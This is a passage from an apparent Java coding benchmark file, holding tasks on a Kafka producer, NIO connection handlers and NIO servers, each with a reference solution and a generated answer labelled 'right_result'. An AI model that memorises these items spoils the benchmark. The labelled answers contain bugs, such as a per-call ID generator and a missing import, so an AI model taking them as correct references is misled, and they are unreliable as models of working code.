    "Canonical_solution": "import org.apache.kafka.clients.producer.KafkaProducer;\nimport org.apache.kafka.clients.producer.Producer;\nimport org.apache.kafka.clients.producer.ProducerConfig;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\n\npublic class MaintenancePlanProducer {\n    private Producer<String, MaintenancePlan> _producer;\n\n    public MaintenancePlanProducer(String bootstrapServers, Properties overrides) {\n        Properties props = new Properties();\n        props.setProperty(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.setProperty(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getCanonicalName());\n        props.setProperty(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, MaintenancePlanSerde.class.getCanonicalName());\n        \n        if (overrides != null) {\n            props.putAll(overrides);\n        }\n        \n        _producer = new KafkaProducer<>(props);\n    }\n\n    public void sendPlan(String topic, MaintenancePlan maintenancePlan) {\n        _producer.send(new ProducerRecord<>(topic, maintenancePlan), (recordMetadata, e) -> {\n            if (e != null) {\n                throw new RuntimeException(\"Failed to produce maintenance plan\", e);\n            }\n        });\n    }\n\n    public void close() {\n        _producer.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 31,
    "right_result": "```java\nimport org.apache.kafka.clients.producer.*;\nimport org.apache.kafka.common.serialization.StringSerializer;\nimport java.util.Properties;\n\npublic class MaintenancePlanProducer {\n    private final KafkaProducer<String, MaintenancePlan> _producer;\n\n    public MaintenancePlanProducer(String bootstrapServers, Properties overrides) {\n        Properties props = new Properties();\n        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName());\n        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, MaintenancePlanSerializer.class.getName());\n\n        if (overrides != null) {\n            props.putAll(overrides);\n        }\n\n        _producer = new KafkaProducer<>(props);\n    }\n\n    public void sendPlan(String topic, MaintenancePlan maintenancePlan) {\n        ProducerRecord<String, MaintenancePlan> record =\n                new ProducerRecord<>(topic, maintenancePlan.getId(), maintenancePlan);\n\n        _producer.send(record, (metadata, exception) -> {\n            if (exception != null) {\n                exception.printStackTrace();\n            } else {\n                System.out.printf(\"Sent message to topic %s partition %d%n\", metadata.topic(), metadata.partition());\n            }\n        });\n    }\n\n    public void close() {\n        _producer.close();\n    }\n}\n```"
  },
  {
    "Task_id": 262,
    "Instruction": "Task Description: Implement a Java class that manages non-blocking HTTP connections using Java NIO (New I/O) capabilities. The class should handle connection establishment, connection queue management, and distribute connections across multiple processors for load balancing.\n\nClass Description: NIOConnector is a thread-based class that manages asynchronous HTTP connections using Java NIO. It maintains a queue of pending connections, establishes them asynchronously, and distributes successfully established connections to a pool of NIOProcessor instances for further processing.\n\nAttributes:\n- name: String - The name identifier for this connector thread\n- selector: Selector - The NIO selector used for monitoring connection events\n- connectQueue: BlockingQueue<BackendConnection> - Queue holding pending connection requests\n- processors: NIOProcessor[] - Array of processors for handling established connections\n- nextProcessor: int - Index for round-robin processor selection\n- connectCount: long - Counter for tracking connection attempts\n\nMethods:\n- NIOConnector(String name) -> void - Constructor that initializes the connector with a name and opens a new selector\n- setProcessors(NIOProcessor[] processors) -> void - Sets the array of processors for connection distribution\n- postConnect(BackendConnection c) -> void - Adds a new connection request to the queue and wakes up the selector\n- run() -> void - Main thread loop that handles connection establishment and event processing\n- connect(Selector selector) -> void - Processes pending connections from the queue\n- finishConnect(SelectionKey key, Object att) -> void - Completes the connection process for a channel\n- clearSelectionKey(SelectionKey key) -> void - Cleans up a selection key after processing\n- nextProcessor() -> NIOProcessor - Selects the next processor in round-robin fashion\n\nInner Class:\n- ConnectIdGenerator - Generates unique IDs for established connections with thread-safe incrementing",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.util.Set;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\nimport org.apache.log4j.Logger;\n\npublic final class NIOConnector extends Thread {\n    private static final Logger LOGGER = Logger.getLogger(NIOConnector.class);\n    private static final ConnectIdGenerator ID_GENERATOR = new ConnectIdGenerator();\n\n    private final String name;\n    private final Selector selector;\n    private final BlockingQueue<BackendConnection> connectQueue;\n    private NIOProcessor[] processors;\n    private int nextProcessor;\n    private long connectCount;\n\n    public NIOConnector(String name) throws IOException {\n        super.setName(name);\n        this.name = name;\n        this.selector = Selector.open();\n        this.connectQueue = new LinkedBlockingQueue<BackendConnection>();\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        connectQueue.offer(c);\n        selector.wakeup();\n    }\n\n    @Override\n    public void run() {\n        final Selector selector = this.selector;\n        for (;;) {\n            ++connectCount;\n            try {\n                selector.select(1000L);\n                connect(selector);\n                Set<SelectionKey> keys = selector.selectedKeys();\n                try {\n                    for (SelectionKey key : keys) {\n                        Object att = key.attachment();\n                        if (att != null && key.isValid() && key.isConnectable()) {\n                            finishConnect(key, att);\n                        } else {\n                            key.cancel();\n                        }\n                    }\n                } finally {\n                    keys.clear();\n                }\n            } catch (Throwable e) {\n                LOGGER.warn(name, e);\n            }\n        }\n    }\n\n    private void connect(Selector selector) {\n        BackendConnection c = null;\n        while ((c = connectQueue.poll()) != null) {\n            try {\n                c.connect(selector);\n            } catch (Throwable e) {\n                c.error(ErrorCode.ERR_CONNECT_SOCKET, e);\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        BackendConnection c = (BackendConnection) att;\n        try {\n            if (c.finishConnect()) {\n                clearSelectionKey(key);\n                c.setId(ID_GENERATOR.getId());\n                NIOProcessor processor = nextProcessor();\n                c.setProcessor(processor);\n                processor.postRegister(c);\n            }\n        } catch (Throwable e) {\n            clearSelectionKey(key);\n            c.error(ErrorCode.ERR_FINISH_CONNECT, e);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        if (key.isValid()) {\n            key.attach(null);\n            key.cancel();\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        if (++nextProcessor == processors.length) {\n            nextProcessor = 0;\n        }\n        return processors[nextProcessor];\n    }\n\n    private static class ConnectIdGenerator {\n        private static final long MAX_VALUE = Long.MAX_VALUE;\n        private long connectId = 0L;\n        private final Object lock = new Object();\n\n        private long getId() {\n            synchronized (lock) {\n                if (connectId >= MAX_VALUE) {\n                    connectId = 0L;\n                }\n                return ++connectId;\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 20,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.util.concurrent.*;\n\npublic class NIOConnector extends Thread {\n    private final String name;\n    private final Selector selector;\n    private final BlockingQueue<BackendConnection> connectQueue = new LinkedBlockingQueue<>();\n    private NIOProcessor[] processors;\n    private int nextProcessor = 0;\n    private long connectCount = 0;\n\n    public NIOConnector(String name) throws IOException {\n        this.name = name;\n        this.selector = Selector.open();\n    }\n\n    public void setProcessors(NIOProcessor[] processors) {\n        this.processors = processors;\n    }\n\n    public void postConnect(BackendConnection c) {\n        try {\n            connectQueue.put(c);\n            selector.wakeup();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            while (!Thread.interrupted()) {\n                connect(selector);\n                int keys = selector.selectNow();\n                if (keys > 0) {\n                    for (SelectionKey key : selector.selectedKeys()) {\n                        if (key.isConnectable()) {\n                            finishConnect(key, key.attachment());\n                        }\n                    }\n                    selector.selectedKeys().clear();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                selector.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void connect(Selector selector) {\n        BackendConnection conn;\n        while ((conn = connectQueue.poll()) != null) {\n            try {\n                SocketChannel channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                channel.connect(new InetSocketAddress(conn.getHost(), conn.getPort()));\n                SelectionKey key = channel.register(selector, SelectionKey.OP_CONNECT);\n                key.attach(conn);\n                connectCount++;\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void finishConnect(SelectionKey key, Object att) {\n        SocketChannel channel = (SocketChannel) key.channel();\n        BackendConnection conn = (BackendConnection) att;\n        try {\n            if (channel.finishConnect()) {\n                conn.setId(new ConnectIdGenerator().generateId());\n                NIOProcessor processor = nextProcessor();\n                processor.addConnection(channel, conn);\n                clearSelectionKey(key);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            clearSelectionKey(key);\n        }\n    }\n\n    private void clearSelectionKey(SelectionKey key) {\n        if (key != null) {\n            key.cancel();\n            try {\n                key.channel().close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private NIOProcessor nextProcessor() {\n        synchronized (this) {\n            NIOProcessor p = processors[nextProcessor];\n            nextProcessor = (nextProcessor + 1) % processors.length;\n            return p;\n        }\n    }\n\n    static class ConnectIdGenerator {\n        private long id = 0;\n\n        synchronized long generateId() {\n            return ++id;\n        }\n    }\n}\n\nclass BackendConnection {\n    private final String host;\n    private final int port;\n    private long id;\n\n    public BackendConnection(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String getHost() {\n        return host;\n    }\n\n    public int getPort() {\n        return port;\n    }\n\n    public long getId() {\n        return id;\n    }\n\n    public void setId(long id) {\n        this.id = id;\n    }\n}\n\nclass NIOProcessor {\n    public void addConnection(SocketChannel channel, BackendConnection connection) {\n        // Implement connection handling logic here\n    }\n}\n```"
  },
  {
    "Task_id": 263,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles multiple client connections asynchronously, measures throughput performance, and tracks message statistics.\n\nClass Description: NioServerPerfTest is a non-blocking NIO server implementation that accepts client connections, reads data efficiently, and tracks performance metrics including bytes received, messages processed, and throughput rates.\n\nAttributes:\n- ch: [ServerSocketChannel] - The server socket channel listening for incoming connections\n- selector: [Selector] - The selector managing multiple non-blocking channels\n- running: [boolean] - Flag controlling server execution\n- buffer: [ByteBuffer] - Buffer for reading incoming data\n- total_bytes_received: [AtomicLong] - Counter for total bytes received\n- total_msgs: [AtomicLong] - Counter for total messages processed\n- start: [AtomicLong] - Timestamp for performance measurement start\n\nMethods:\n- create: [create(int size, boolean direct)] -> [ByteBuffer] - Creates a new ByteBuffer of given size, optionally direct\n- start: [start(boolean direct)] -> [void] - Starts the NIO server with specified buffer type (direct/heap)\n- handle: [handle(SocketChannel ch, ByteBuffer buf)] -> [boolean] - Handles read operations from a client channel, returns false to close connection",
    "Canonical_solution": "import org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class NioServerPerfTest {\n    protected ServerSocketChannel ch;\n    protected Selector            selector;\n    protected volatile boolean    running=true;\n    protected ByteBuffer          buffer;\n    protected final AtomicLong    total_bytes_received=new AtomicLong(0);\n    protected final AtomicLong    total_msgs=new AtomicLong(0);\n    protected final AtomicLong    start=new AtomicLong(0);\n\n    public static final long      BYTES_TO_SEND=10_000_000;\n    public static final int       SIZE=1000;\n\n    protected static ByteBuffer create(int size, boolean direct) {\n        return direct? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    protected void start(boolean direct) throws Exception {\n        selector=Selector.open();\n\n        ch=ServerSocketChannel.open();\n        ch.bind(new InetSocketAddress(\"0.0.0.0\", 7500));\n        ch.configureBlocking(false);\n        ch.register(selector, SelectionKey.OP_ACCEPT, null);\n        System.out.println(\"-- server ready\");\n\n        while(running) {\n            selector.select();\n            Set<SelectionKey> keys=selector.selectedKeys();\n            for(Iterator<SelectionKey> it=keys.iterator(); it.hasNext();) {\n                SelectionKey key=it.next();\n                if(!key.isValid()) {\n                    it.remove();\n                    continue;\n                }\n                it.remove();\n                if(key.isAcceptable()) {\n                    SocketChannel client_ch=ch.accept();\n                    if(client_ch != null) {\n                        System.out.printf(\"accepted connection from %s\\n\", client_ch.getRemoteAddress());\n                        client_ch.configureBlocking(false);\n                        client_ch.register(selector, SelectionKey.OP_READ, create(SIZE, direct));\n                    }\n                }\n                else if(key.isReadable()) {\n                    if(!handle((SocketChannel)key.channel(), (ByteBuffer)key.attachment())) {\n                        key.cancel();\n                        Util.close(key.channel());\n                    }\n                }\n            }\n        }\n\n        Util.close(selector,ch);\n    }\n\n    protected boolean handle(SocketChannel ch, ByteBuffer buf) {\n        try {\n            if(start.get() == 0)\n                start.compareAndSet(0, System.currentTimeMillis());\n            int num=ch.read(buf);\n            if(num < 0)\n                return false;\n            total_bytes_received.addAndGet(num);\n            if(!buf.hasRemaining()) {\n                total_msgs.incrementAndGet();\n                buf.rewind();\n            }\n            if(total_bytes_received.get() >= BYTES_TO_SEND) {\n                long time=System.currentTimeMillis() - start.get();\n                double throughput_sec=total_bytes_received.get() / (time / 1000.0), msgs_sec=total_msgs.get() / (time / 1000.0);\n                System.out.printf(\"\\n===========================\\nreceived %d messages in %.2f secs: throughput: %s/sec, %.2f msgs/sec\\n\",\n                                  total_msgs.get(), time/1000.0, Util.printBytes(throughput_sec), msgs_sec);\n                start.set(0);\n                total_bytes_received.set(0);\n                total_msgs.set(0);\n                return false;\n            }\n        }\n        catch(IOException e) {\n            e.printStackTrace();\n        }\n        return true;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.util.Iterator;\nimport java.util.Set;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class NioServerPerfTest {\n    private ServerSocketChannel ch;\n    private Selector selector;\n    private boolean running;\n    private ByteBuffer buffer;\n    private AtomicLong total_bytes_received = new AtomicLong(0);\n    private AtomicLong total_msgs = new AtomicLong(0);\n    private AtomicLong start = new AtomicLong(System.currentTimeMillis());\n\n    public static void main(String[] args) throws IOException {\n        NioServerPerfTest server = new NioServerPerfTest();\n        server.start(true);\n    }\n\n    public void start(boolean direct) throws IOException {\n        this.ch = ServerSocketChannel.open();\n        this.ch.configureBlocking(false);\n        this.ch.bind(new InetSocketAddress(\"localhost\", 8080));\n        this.selector = Selector.open();\n        this.ch.register(selector, SelectionKey.OP_ACCEPT);\n        this.running = true;\n        this.buffer = create(1024, direct);\n\n        while (running) {\n            int readyChannels = selector.selectNow();\n            if (readyChannels == 0) continue;\n\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> keyIterator = selectedKeys.iterator();\n\n            while (keyIterator.hasNext()) {\n                SelectionKey key = keyIterator.next();\n                keyIterator.remove();\n\n                if (!key.isValid()) continue;\n\n                if (key.isAcceptable()) {\n                    registerClient(key);\n                } else if (key.isReadable()) {\n                    processRead(key);\n                }\n            }\n        }\n\n        System.out.println(\"Total bytes received: \" + total_bytes_received.get());\n        System.out.println(\"Total messages processed: \" + total_msgs.get());\n        long elapsedSeconds = (System.currentTimeMillis() - start.get()) / 1000;\n        System.out.println(\"Throughput (msgs/sec): \" + (total_msgs.get() / (double) elapsedSeconds));\n        System.out.println(\"Throughput (bytes/sec): \" + (total_bytes_received.get() / (double) elapsedSeconds));\n    }\n\n    private void registerClient(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        if (clientChannel != null) {\n            clientChannel.configureBlocking(false);\n            clientChannel.register(selector, SelectionKey.OP_READ);\n        }\n    }\n\n    private void processRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer bufferCopy = create(1024, false);\n        int bytesRead = clientChannel.read(bufferCopy);\n\n        if (bytesRead == -1) {\n            clientChannel.close();\n            return;\n        }\n\n        bufferCopy.flip();\n        byte[] data = new byte[bufferCopy.remaining()];\n        bufferCopy.get(data);\n        String message = new String(data);\n        total_bytes_received.addAndGet(bytesRead);\n        total_msgs.incrementAndGet();\n\n        if (!handle(clientChannel, bufferCopy)) {\n            clientChannel.close();\n        }\n    }\n\n    public boolean handle(SocketChannel ch, ByteBuffer buf) {\n        try {\n            // Example logic to detect end of message (e.g., newline or fixed size)\n            if (buf.position() > 0) {\n                buf.clear(); // reset for next read\n            }\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public ByteBuffer create(int size, boolean direct) {\n        return direct ? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n}\n```"
  },
  {
    "Task_id": 264,
    "Instruction": "Task Description: Implement a Java class that handles asynchronous socket connections using Java NIO (Non-blocking I/O) to manage incoming connections for a high-availability service. The class should be abstract, allowing subclasses to define specific connection handling logic.\n\nClass Description: AcceptSocketService is an abstract class that extends ServiceThread to provide a non-blocking socket server implementation. It manages incoming socket connections using ServerSocketChannel and Selector, delegating the creation of specific connection handlers to subclasses through an abstract method. The class handles the lifecycle of the server socket, including startup, connection acceptance, and shutdown.\n\nAttributes:\n- socketAddressListen: [SocketAddress] - The address and port to listen for incoming connections\n- serverSocketChannel: [ServerSocketChannel] - The server socket channel for accepting connections\n- selector: [Selector] - The selector for managing multiple non-blocking channels\n- messageStoreConfig: [MessageStoreConfig] - Configuration object containing server settings\n- log: [Logger] - Logger instance for recording events and errors\n\nMethods:\n- AcceptSocketService([MessageStoreConfig messageStoreConfig]) -> [void] - Constructor that initializes the service with configuration\n- beginAccept() -> [void] - Initializes and starts the server socket channel and selector\n- shutdown([boolean interrupt]) -> [void] - Shuts down the service and cleans up resources\n- run() -> [void] - Main service loop that handles incoming connections (inherited from ServiceThread)\n- createConnection([SocketChannel sc]) -> [HAConnection] - Abstract method to be implemented by subclasses for creating connection handlers",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Set;\nimport org.apache.rocketmq.logging.org.slf4j.Logger;\nimport org.apache.rocketmq.logging.org.slf4j.LoggerFactory;\nimport org.apache.rocketmq.store.config.MessageStoreConfig;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\n\nprotected abstract class AcceptSocketService extends ServiceThread {\n    private final SocketAddress socketAddressListen;\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n    private final MessageStoreConfig messageStoreConfig;\n    private static final Logger log = LoggerFactory.getLogger(LoggerName.STORE_LOGGER_NAME);\n\n    public AcceptSocketService(final MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.socketAddressListen = new InetSocketAddress(messageStoreConfig.getHaListenPort());\n    }\n\n    public void beginAccept() throws Exception {\n        this.serverSocketChannel = ServerSocketChannel.open();\n        this.selector = NetworkUtil.openSelector();\n        this.serverSocketChannel.socket().setReuseAddress(true);\n        this.serverSocketChannel.socket().bind(this.socketAddressListen);\n        if (0 == messageStoreConfig.getHaListenPort()) {\n            messageStoreConfig.setHaListenPort(this.serverSocketChannel.socket().getLocalPort());\n            log.info(\"OS picked up {} to listen for HA\", messageStoreConfig.getHaListenPort());\n        }\n        this.serverSocketChannel.configureBlocking(false);\n        this.serverSocketChannel.register(this.selector, SelectionKey.OP_ACCEPT);\n    }\n\n    @Override\n    public void shutdown(final boolean interrupt) {\n        super.shutdown(interrupt);\n        try {\n            if (null != this.serverSocketChannel) {\n                this.serverSocketChannel.close();\n            }\n            if (null != this.selector) {\n                this.selector.close();\n            }\n        } catch (IOException e) {\n            log.error(\"AcceptSocketService shutdown exception\", e);\n        }\n    }\n\n    @Override\n    public void run() {\n        log.info(this.getServiceName() + \" service started\");\n        while (!this.isStopped()) {\n            try {\n                this.selector.select(1000);\n                Set<SelectionKey> selected = this.selector.selectedKeys();\n                if (selected != null) {\n                    for (SelectionKey k : selected) {\n                        if (k.isAcceptable()) {\n                            SocketChannel sc = ((ServerSocketChannel) k.channel()).accept();\n                            if (sc != null) {\n                                log.info(\"HAService receive new connection, \" + sc.socket().getRemoteSocketAddress());\n                                try {\n                                    HAConnection conn = createConnection(sc);\n                                    conn.start();\n                                } catch (Exception e) {\n                                    log.error(\"new HAConnection exception\", e);\n                                    sc.close();\n                                }\n                            }\n                        } else {\n                            log.warn(\"Unexpected ops in select \" + k.readyOps());\n                        }\n                    }\n                    selected.clear();\n                }\n            } catch (Exception e) {\n                log.error(this.getServiceName() + \" service has exception.\", e);\n            }\n        }\n        log.info(this.getServiceName() + \" service end\");\n    }\n\n    protected abstract HAConnection createConnection(final SocketChannel sc) throws IOException;\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.logging.Logger;\n\npublic abstract class AcceptSocketService extends ServiceThread {\n    protected final SocketAddress socketAddressListen;\n    protected ServerSocketChannel serverSocketChannel;\n    protected Selector selector;\n    protected final MessageStoreConfig messageStoreConfig;\n    protected final Logger log;\n\n    public AcceptSocketService(MessageStoreConfig messageStoreConfig) {\n        this.messageStoreConfig = messageStoreConfig;\n        this.socketAddressListen = new InetSocketAddress(messageStoreConfig.getHost(), messageStoreConfig.getPort());\n        this.log = Logger.getLogger(AcceptSocketService.class.getName());\n    }\n\n    protected void beginAccept() throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.bind(socketAddressListen);\n\n        selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n    }\n\n    @Override\n    public void shutdown(boolean interrupt) {\n        try {\n            if (serverSocketChannel != null && serverSocketChannel.isOpen()) {\n                serverSocketChannel.close();\n            }\n            if (selector != null && selector.isOpen()) {\n                selector.close();\n            }\n        } catch (IOException e) {\n            log.severe(\"Error closing resources during shutdown: \" + e.getMessage());\n        }\n        super.shutdown(interrupt);\n    }\n\n    @Override\n    public void run() {\n        try {\n            beginAccept();\n            while (!isInterrupted()) {\n                int readyChannels = selector.select(1000);\n                if (readyChannels == 0) {\n                    continue;\n                }\n\n                for (SelectionKey key : selector.selectedKeys()) {\n                    if (!key.isValid()) {\n                        continue;\n                    }\n\n                    if (key.isAcceptable()) {\n                        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n                        SocketChannel sc = serverChannel.accept();\n                        if (sc != null) {\n                            sc.configureBlocking(false);\n                            HAConnection connectionHandler = createConnection(sc);\n                            connectionHandler.start();\n                        }\n                    }\n                }\n                selector.selectedKeys().clear();\n            }\n        } catch (IOException e) {\n            log.severe(\"IOException in AcceptSocketService: \" + e.getMessage());\n        } finally {\n            shutdown(true);\n        }\n    }\n\n    protected abstract HAConnection createConnection(SocketChannel sc);\n}\n```"
  },
  {
    "Task_id": 265,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles client connections asynchronously, processes incoming requests, and sends responses back to clients. The server should use non-blocking I/O operations managed by a Selector to efficiently handle multiple connections.\n\nClass Description: NioHttpServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) capabilities. It manages client connections, reads incoming requests, and writes responses asynchronously. The server can also make HTTP requests to external services (like Baidu in the example) to fetch response data.\n\nAttributes:\n- charset: [Charset] - The character set used for encoding/decoding text data (UTF-8 in this case)\n- client: [HttpClient] - Apache HttpClient instance used to make external HTTP requests\n\nMethods:\n- startServer: [startServer(int port)] -> [void] - Starts the HTTP server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop to handle client connections\n- handleAccept: [handleAccept(SelectionKey key, Selector selector)] -> [void] - Handles new client connections by accepting the SocketChannel and registering it with the selector for write operations\n- handleRead: [handleRead(SelectionKey key, Selector selector)] -> [void] - Handles incoming data from clients by reading from the SocketChannel and preparing for write operations\n- handleWrite: [handleWrite(SelectionKey key, Selector selector)] -> [void] - Handles writing data to clients by sending responses through the SocketChannel and preparing for read operations\n- executeResponse: [executeResponse()] -> [String] - Makes an HTTP GET request to an external service (Baidu in the example) and returns the response body as a string",
    "Canonical_solution": "import org.apache.commons.codec.Charsets;\nimport org.apache.http.HttpResponse;\nimport org.apache.http.HttpStatus;\nimport org.apache.http.client.HttpClient;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.HttpClientBuilder;\nimport org.apache.http.util.EntityUtils;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NioHttpServer {\n\n    private static Charset charset = Charset.forName(\"UTF8\");\n    private HttpClient client = HttpClientBuilder.create().build();\n\n    public void startServer(int port) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        Selector selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            if (selector.select(1) > 0) {\n                Set<SelectionKey> set = selector.selectedKeys();\n                Iterator<SelectionKey> keyIterator = set.iterator();\n                while (keyIterator.hasNext()) {\n                    SelectionKey key = keyIterator.next();\n                    if (key.isAcceptable()) {\n                        handleAccept(key, selector);\n                    } else if (key.isReadable()) {\n                        handleRead(key, selector);\n                    } else if (key.isWritable()) {\n                        handleWrite(key, selector);\n                    }\n                    keyIterator.remove();\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        key.interestOps(SelectionKey.OP_WRITE);\n        selector.wakeup();\n    }\n\n    private void handleWrite(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String data = executeResponse().substring(0, 100);\n        byteBuffer.put(data.getBytes());\n        clientChannel.write(byteBuffer);\n        key.interestOps(SelectionKey.OP_READ);\n        selector.wakeup();\n    }\n\n    private String executeResponse() throws IOException {\n        String data = \"\";\n        HttpGet get = new HttpGet(\"http://www.baidu.com\");\n        HttpResponse response = client.execute(get);\n        if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK) {\n            data = EntityUtils.toString(response.getEntity(), Charsets.UTF_8);\n        }\n        return data;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\nimport org.apache.http.HttpEntity;\nimport org.apache.http.client.methods.CloseableHttpResponse;\nimport org.apache.http.client.methods.HttpGet;\nimport org.apache.http.impl.client.CloseableHttpClient;\nimport org.apache.http.impl.client.HttpClients;\nimport org.apache.http.util.EntityUtils;\n\npublic class NioHttpServer {\n    private final Charset charset = Charset.forName(\"UTF-8\");\n    private CloseableHttpClient client = HttpClients.createDefault();\n\n    public void startServer(int port) throws IOException {\n        ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        ServerSocket serverSocket = serverSocketChannel.socket();\n        serverSocket.bind(new InetSocketAddress(port));\n\n        Selector selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        System.out.println(\"Server started on port \" + port);\n\n        while (true) {\n            if (selector.select() == 0) {\n                continue;\n            }\n\n            Set<SelectionKey> selectedKeys = selector.selectedKeys();\n            Iterator<SelectionKey> iter = selectedKeys.iterator();\n\n            while (iter.hasNext()) {\n                SelectionKey key = iter.next();\n                iter.remove();\n\n                if (!key.isValid()) {\n                    continue;\n                }\n\n                if (key.isAcceptable()) {\n                    handleAccept(key, selector);\n                } else if (key.isReadable()) {\n                    handleRead(key, selector);\n                } else if (key.isWritable()) {\n                    handleWrite(key, selector);\n                }\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key, Selector selector) throws IOException {\n        ServerSocketChannel serverSocketChannel = (ServerSocketChannel) key.channel();\n        SocketChannel socketChannel = serverSocketChannel.accept();\n        if (socketChannel != null) {\n            socketChannel.configureBlocking(false);\n            socketChannel.register(selector, SelectionKey.OP_READ);\n        }\n    }\n\n    private void handleRead(SelectionKey key, Selector selector) throws IOException {\n        SocketChannel socketChannel = (SocketChannel) key.channel();\n        